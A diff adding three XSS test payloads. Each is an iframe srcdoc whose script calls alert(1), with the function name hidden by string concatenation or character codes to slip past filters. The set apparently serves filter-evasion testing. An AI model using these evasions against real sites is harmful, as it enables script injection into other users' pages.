@@ -1,0 +1,3 @@
+<iframe srcdoc='<script>window["al"+"ert"](1)</script>'></iframe>
+<iframe srcdoc='<script>window[String.fromCharCode(97,108,101,114,116)](1)</script>'></iframe>
+<iframe srcdoc='<script>window["al"+"ert"](1)</script>'></iframe>
